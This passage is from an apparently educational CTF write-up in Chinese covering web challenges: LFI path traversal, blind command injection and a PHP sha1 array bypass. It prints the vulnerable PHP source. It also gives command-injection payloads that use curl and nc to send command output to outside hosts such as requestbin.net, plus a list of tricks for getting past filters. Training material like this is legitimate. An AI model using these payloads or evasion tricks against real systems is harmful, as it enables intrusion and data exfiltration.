method&#x3D;&quot;POST&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;text&quot; size&#x3D;&quot;50&quot; name&#x3D;&quot;url&quot; placeholder&#x3D;&quot;URL&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;submit&quot;&gt;</span><br><span class="line">&lt;&#x2F;from&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">$url &#x3D; str_replace(&quot;;&quot;, &quot;\;&quot;, $_POST[&#39;url&#39;]);</span><br><span class="line">$output &#x3D; shell_exec(&quot;curl -I -X GET &quot;.$url);</span><br><span class="line">if($output !&#x3D; &quot;&quot;)&#123;</span><br><span class="line">    echo &quot;&lt;h3&gt;Here&#39;s your header :&lt;&#x2F;h3&gt;&quot;;</span><br><span class="line">    $array &#x3D; explode(&quot;\n&quot;,$output);</span><br><span class="line">    echo &quot;&lt;pre&gt;&quot;;</span><br><span class="line">    foreach($array as $str) &#123;</span><br><span class="line">       echo $str;</span><br><span class="line">       echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    echo &quot;&lt;&#x2F;pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Local-File-Inclusion"><a href="#Local-File-Inclusion" class="headerlink" title="Local File Inclusion"></a>Local File Inclusion</h2><p>先注意到網址 會發現他讀取網頁的方式是用GET<br>所以可以很輕易的在網址指定檔案</p>
+<p>是 LFI 比較大的問題是 不知道檔案名稱 又不知道檔案位址<br>所以就要開始通靈 </p>
+<p>跳過通靈的階段 flag 是放在 /flag<br>所以依照上面所說 在網址後面加上 <code>?page=../../../../flag</code> 即可<br>最低至少要跳4層 最高無限層都可以<br>發現沒辦法直接讀/flag</p>
+<h2 id="BABY-CMDi"><a href="#BABY-CMDi" class="headerlink" title="BABY CMDi"></a>BABY CMDi</h2><p>稍微麻煩一點的黑箱題<br>貌似被擋了不少東西</p>
+<p>看到題目 先跟著他的要求輸入 IP</p>
+<p><img src="https://i.imgur.com/o8oyMS7.png"></p>
+<p>看起來是很正常的 <code>ping $_POST[&#39;ip&#39;]</code><br>測試了一下 發現以下幾個東西會被擋掉</p>
+<p><code>&amp; | ; cat flag `</code></p>
+<p>那就來試一下 <code>$(sleep 3)</code><br>成功的讓網頁 sleep 了 3 秒 表示這樣是可行的</p>
+<p>那就試試看 <code>$(ls)</code> 發現並沒有回傳東西<br>可以猜測這題並不會把 system 的運行結果回顯在網頁上<br>於是要嘗試讓執行結果輸出到自己這邊</p>
+<p>開始建構 Payload<br>這邊使用的是 <a target="_blank" rel="noopener" href="https://requestbin.net/">https://requestbin.net</a> </p>
+<p>開一個 private 的 RequestBin</p>
+<p><img src="https://i.imgur.com/tfz1uP3.png"></p>
+<p>那就開始建構 payload 吧</p>
+<p>首先先讓他 curl 我的 RequestBin</p>
+<p><code>$(curl http://requestbin.net/r/1frffe51)</code></p>
+<p>接著讓他把 command 的執行結果用 POST 的方式傳到我的 RequestBin 上<br>這邊先示範 ls 當前資料夾</p>
+<p><code>$(curl -d &quot;$(ls ./)&quot; http://requestbin.net/r/1frffe51)</code></p>
+<blockquote>
+<p>若是 <code>-d $(ls ./)</code> 沒加上 “”<br>會導致執行結果若是出現換行就會出現 Error<br>第一行之後的每一行都會被當成新的 command 來執行</p>
+</blockquote>
+<p>回到 RequestBin 上 refresh 就會看到 ls 的結果了</p>
+<p><img src="https://i.imgur.com/Ewqnn7O.png"></p>
+<p>接著會遇到兩個問題</p>
+<ol>
+<li>這題會擋掉 cat</li>
+<li>這題也會擋掉 flag</li>
+</ol>
+<p>那麼針對這兩點來分別解決</p>
+<ol>
+<li><p>cat 迴避方式</p>
+<ul>
+<li><code>head</code> 讀取檔案</li>
+<li><code>diff</code> 比較檔案</li>
+<li><code>c\at</code> 反斜線迴避</li>
+<li><code>c&#39;&#39;at</code> 引號內空值</li>
+<li><code>od</code> 8 進位讀取檔案<ul>
+<li>-a 輸出 ascii </li>
+</ul>
+</li>
+<li><code>bzmore</code> 讀取檔案</li>
+<li><code>/???/??t</code> == <code>/usr/cat</code></li>
+<li><code>grep</code> 搜尋檔案內符合條件的字串<ul>
+<li><code>-i</code> 忽略大小寫</li>
+<li><code>-P</code> 配合正規表達式</li>
+<li><code>-r</code> 讀取當前資料夾下所有檔案 並且尋找符合的結果</li>
+</ul>
+</li>
+<li><code>tail</code> 讀取檔案最後的部分</li>
+<li><code>cut</code> 讀取檔案特定範圍<ul>
+<li>-b 輸出特定範圍的 bytes<ul>
+<li><code>-b n</code> 輸出第 n 個字</li>
+<li><code>-b n-</code> 第 n 到最後一個字</li>
+<li><code>-b n-m</code> 輸出 n ~ m 的字</li>
+<li><code>-b -m</code> 輸出 m 前面的字</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><code>sed</code> 文字內容處理<ul>
+<li><code>sed &#39;r&#39; &lt;file&gt;</code> 讀取檔案</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>flag 迴避方式</p>
+<ul>
+<li><code>./f*</code> == <code>./fl*</code> == <code>./fla*</code> == <code>./flag</code></li>
+<li><code>./f???</code> == <code>./flag</code> == <code>./flxx</code></li>
+<li><code>./fl\ag</code></li>
+<li><code>./fl$&#123;wtf&#125;ag</code> == <code>./fl&#39;&#39;ag</code> wtf 未被賦值 所以為 null </li>
+<li><code>a=fl b=ag $&#123;a&#125;$&#123;b&#125;</code></li>
+<li>使用 <code>grep -r</code> 不需要加上檔名 只需接上要尋找的字串</li>
+</ul>
+</li>
+<li><p>綜合技</p>
+<ul>
+<li><code>/???/c?? ./f???</code></li>
+<li><code>/u*r/*d ./f?*</code></li>
+<li><code>grep -iP &quot;&#123;[a-zA-Z0-9_]*&#125;&quot; fl\ag</code></li>
+<li><code>diff ./fl* /etc/passwd</code></li>
+<li><code>grep -r &quot;&#123;&quot;</code></li>
+</ul>
+</li>
+</ol>
+<blockquote>
+<p>補充 : 用 Python Flask 和 webhook 建立簡單 request 接收器</p>
+<p>首先先建立一個 python 檔</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, abort</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&quot;/&quot;, methods=[&#x27;POST&#x27;,&#x27;GET&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_data</span>():</span></span><br><span class="line">        body = request.get_data(as_text=<span class="literal">True</span>)</span><br><span class="line">        print(body)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;OK&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    port = int(os.environ.get(<span class="string">&#x27;PORT&#x27;</span>, <span class="number">80</span>))</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=port)</span><br></pre></td></tr></table></figure>
+<p>這個 python 可以幫我們把 Flask run 起來，並且在 <code>0.0.0.0:80</code> 上執行</p>
+<p>接下來要新增一個 webhook 將連結導向我們的本機端，這裡使用 ngrok<br>要先下載好 ngrok 喔!</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ngrok http 80</span><br></pre></td></tr></table></figure>
+
+<p>最後只需要將前面 curl 的連結改成在 ngrok 上看到的連結即可<br><img src="https://i.imgur.com/4DxqNv4.png"></p>
+<p>最後我們的結果可以在 python 中看到<br><img src="https://i.imgur.com/PNl0NM3.png"></p>
+</blockquote>
+<blockquote>
+<p>source code</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;Baby CMDi&lt;&#x2F;h2&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action&#x3D;&quot;index.php&quot; method&#x3D;&quot;POST&quot;&gt;</span><br><span class="line">&lt;input name&#x3D;&quot;ip&quot; type&#x3D;&quot;text&quot; placeholder&#x3D;&quot;Enter IP&quot; &#x2F;&gt;&lt;br &#x2F;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;Submit&quot; &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">if ($_SERVER[&#39;REQUEST_METHOD&#39;] &#x3D;&#x3D;&#x3D; &#39;POST&#39; &amp;&amp; isset($_POST[&#39;ip&#39;])) &#123;</span><br><span class="line"> $waf &#x3D; array(&quot;&amp;&quot;, &quot;|&quot;, &quot;;&quot;, &quot;&#96;&quot;, &quot;&gt;&quot;, &quot;\t&quot;, &quot;\r&quot;, &quot;\n&quot;, &quot;cat&quot;, &quot;flag&quot;);</span><br><span class="line"> foreach($waf as $banner)&#123;</span><br><span class="line">        if(stripos($_POST[&#39;ip&#39;], $banner) !&#x3D;&#x3D; FALSE) die(&quot;Get Out of Here&quot;);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> $result &#x3D; shell_exec(&quot;ping -c 3 &quot; . $_POST[&#39;ip&#39;]);</span><br><span class="line"> echo &quot;&lt;pre&gt;&quot; . $result . &quot;&lt;&#x2F;pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h1 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h1><h2 id="MyPHP"><a href="#MyPHP" class="headerlink" title="MyPHP"></a>MyPHP</h2><blockquote>
+<p>Point : php中array的特性～sha1[] = NULL</p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/en/types.comparisons.php">PHP Comparisons Table</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;user.php&quot;</span>);</span><br><span class="line"><span class="comment">// $users = Array(&#x27;admin&#x27;=&gt;&#x27;xxxx&#x27;, ...)</span></span><br><span class="line"></span><br><span class="line">$user = $_GET[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">$pass = $_GET[<span class="string">&#x27;pass&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($user) &amp;&amp; <span class="keyword">isset</span>($pass)) &#123;</span><br><span class="line">    <span class="keyword">if</span>($users[$user] === sha1($pass))</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Q______________Q&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>if的比較是 “===” 不能運用弱型別，要讓它都是NULL。<br>輸入 <code>http://140.110.112.32:4010/?user=-1&amp;pass[]=</code></p>
+<h2 id="youtube-viewer"><a href="#youtube-viewer" class="headerlink" title="youtube_viewer"></a>youtube_viewer</h2><blockquote>
+<p>解法一 : nc</p>
+</blockquote>
+<p>首先看到題目<br>一個youtube 載入器?<br>輸入youtube 影片上最後段的url 題目就會幫忙把影片讀取出來</p>
+<p>猜測code：</p>
+<figure class="highlight plain"><figcaption><span>-i 'xxx/[input]/xxx'``` or</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">&#96;&#96;&#96;curl -i &quot;xxx&#x2F;[input]&#x2F;xxx&quot;&#96;&#96;&#96; </span><br><span class="line"></span><br><span class="line">可控的在中間那邊 </span><br><span class="line">應該是Blind Command Injection</span><br><span class="line">開始建構payload </span><br><span class="line"></span><br><span class="line">1. 先閉合前面</span><br><span class="line">&#x3D;&#x3D;&gt; &#96;&#96;&#96;&#39;&#96;&#96;&#96;</span><br><span class="line">2. 把後面也處理好</span><br><span class="line">&#x3D;&#x3D;&gt; &#96;&#96;&#96;&#39;&#39;&#96;&#96;&#96;</span><br><span class="line">3. 連接前後</span><br><span class="line">&#96;&#96;&#96;&#39; + &amp;payload &amp;&amp; $payload &#x3D; &#39;&#96;&#96;&#96;</span><br><span class="line">4. 加上要執行的cmd</span><br><span class="line">&#x3D;&#x3D;&gt; &#96;&#96;&#96;&#39; + $payload || ls -al &amp;&amp; $payload &#x3D; &#39;&#96;&#96;&#96;</span><br><span class="line">5. 因為結果不會print 出來 所以要回傳到自己的server</span><br><span class="line">&#x3D;&#x3D;&gt; &#96;&#96;&#96;&#39; + $payload || ls -al | nc ctf.bitx.tw 1234 &amp;&amp; $payload &#x3D; &#39;&#96;&#96;&#96;</span><br><span class="line"></span><br><span class="line">**&#96;&#96;&#96;nc ctf.bitx.tw 1234&#96;&#96;&#96;**</span><br><span class="line">是拿來跟server 建立聊天室用的</span><br><span class="line"></span><br><span class="line">server上要執行</span><br><span class="line">**&#96;&#96;&#96;nc -l 1234&#96;&#96;&#96;**</span><br><span class="line"></span><br><span class="line">最終payload </span><br><span class="line">**&#96;&#96;&#96;&#39; + $payload || ls -al | cat &#x2F;flag | nc ctf.bitx.tw 1234 &amp;&amp; $payload &#x3D; &#39;&#96;&#96;&#96;**</span><br><span class="line"></span><br><span class="line">&gt; 解法二 : double quote ( 解法解釋請見 [BABY CMDi](https:&#x2F;&#x2F;hackmd.io&#x2F;feH6s4g3S0GAAuONsg3s0Q?both#BABY-CMDi)</span><br><span class="line"></span><br><span class="line">payload: &#96;&#39;&quot;$(curl http:&#x2F;&#x2F;requestbin.net&#x2F;r&#x2F;12zvlvr1 --data &quot;$(ls -ahl &#x2F;)&quot;)&quot;&#39;&#96;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&gt; source code</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;htmlembedded&#x3D;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;link href&#x3D;&quot;https:&#x2F;&#x2F;fonts.googleapis.com&#x2F;css?family&#x3D;IM+Fell+French+Canon+SC&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body style&#x3D;&quot;background-color: #fefad0;font-family: &#39;IM Fell French Canon SC&#39;, serif;font-size:20px&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;h1&gt;Youtube Viewer&lt;&#x2F;h1&gt;</span><br><span class="line"></span><br><span class="line">Give me a valid youtube id:</span><br><span class="line">&lt;form method&#x3D;&quot;get&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;v&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;submit&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">Example: uCLEq9V0-Yk</span><br><span class="line">&lt;br&gt;</span><br><span class="line">I will check your input is valid youtube id or not.</span><br><span class="line">&lt;br&gt;&lt;br&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">        $default&#x3D;&quot;uCLEq9V0-Yk&quot;;</span><br><span class="line">        if(isset($_GET[&#39;v&#39;])) &#123;</span><br><span class="line">                $tmp &#x3D; $_GET[&#39;v&#39;];</span><br><span class="line">                $res &#x3D; shell_exec(&quot;curl -i &#39;https:&#x2F;&#x2F;img.youtube.com&#x2F;vi&#x2F;$tmp&#x2F;0.jpg&#39;&quot;);</span><br><span class="line">                if(strpos($res, &quot;404 Not Found&quot;) !&#x3D;&#x3D; FALSE) &#123;</span><br><span class="line">                        echo &quot;&lt;h3&gt;Q___Q  Your input seems invalid.&lt;&#x2F;h3&gt;&lt;br&gt;&quot;;</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                        $default &#x3D; $tmp;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;iframe id&#x3D;&quot;ytplayer&quot; type&#x3D;&quot;text&#x2F;html&quot; width&#x3D;&quot;640&quot; height&#x3D;&quot;360&quot;</span><br><span class="line">  src&#x3D;&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;embed&#x2F;&lt;?php echo $default; ?&gt;?autoplay&#x3D;0&quot;</span><br><span class="line">  frameborder&#x3D;&quot;0&quot;&gt;&lt;&#x2F;iframe&gt;</span><br><span class="line">&lt;!-- hint: backend will download&#x2F;view the youtube video image and check it exist or not. --&gt;</span><br><span class="line">&lt;!-- Try more payload --&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br></pre></td></tr></table></figure>
+
+<p>協作者</p>
+<blockquote>
+<p>[name=MuMu]<br>[name=Koios1143]<br>[name=nella17]</p>
+</blockquote>
+<h6 id="tags-Web-SCIST"><a href="#tags-Web-SCIST" class="headerlink" title="tags: Web SCIST"></a>tags: <code>Web</code> <code>SCIST</code></h6>
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+  <div class="followme">
+    <span>歡迎關注我的其它發布渠道</span>
+
+    <div class="social-list">
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="atom.xml">
+            <span class="icon">
+              <i class="fa fa-rss"></i>
+            </span>
+
+            <span class="label">RSS</span>
+          </a>
+        </div>
+    </div>
+  </div>
+
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+            </div>
+            <div class="post-nav-item">
+                <a href="/blog/2021/01/28/%E7%82%BA%E7%94%9A%E9%BA%BCflash%E8%A2%AB%E6%B7%98%E6%B1%B0/" rel="next" title="2021 1月 科普好文 - 為甚麼flash被淘汰">
+                  2021 1月 科普好文 - 為甚麼flash被淘汰 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+  
+  
+  
+
+
+
+      
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      const activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      const commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+    </div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+      
+
+      
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">SCIST</span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="訪客總數">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="總瀏覽次數">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+    </div>
+  </footer>
+
+  
+  <script src="//cdn.jsdelivr.net/npm/animejs@3.2.0/lib/anime.min.js"></script>
+<script src="/blog/js/utils.js"></script><script src="/blog/js/motion.js"></script><script src="/blog/js/next-boot.js"></script>
+
+  
+
+
+
+
+  <script src="/blog/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+
+
+
+  
+
+  
+      <script>
+  if (typeof MathJax === 'undefined') {
+    window.MathJax = {
+      tex: {
+        inlineMath: {'[+]': [['$', '$']]},
+        tags: 'ams'
+      },
+      options: {
+        renderActions: {
+          findScript: [10, doc => {
+            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+              const display = !!node.type.match(/; *mode=display/);
+              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+              const text = document.createTextNode('');
+              node.parentNode.replaceChild(text, node);
+              math.start = {node: text, delim: '', n: 0};
+              math.end = {node: text, delim: '', n: 0};
+              doc.math.push(math);
+            });
+          }, '', false],
+          insertedScript: [200, () => {
+            document.querySelectorAll('mjx-container').forEach(node => {
+              const target = node.parentNode;
+              if (target.nodeName.toLowerCase() === 'li') {
+                target.parentNode.classList.add('has-jax');
+              }
+            });
+          }, '', false]
+        }
+      }
+    };
+    (function () {
+      const script = document.createElement('script');
+      script.src = '//cdn.jsdelivr.net/npm/mathjax@3.1.0/es5/tex-mml-chtml.js';
+      script.defer = true;
+      document.head.appendChild(script);
+    })();
+  } else {
+    MathJax.startup.document.state(0);
+    MathJax.typesetClear();
+    MathJax.texReset();
+    MathJax.typeset();
+  }
+</script>
+
+    
+
+  
+
+</body>
+</html>
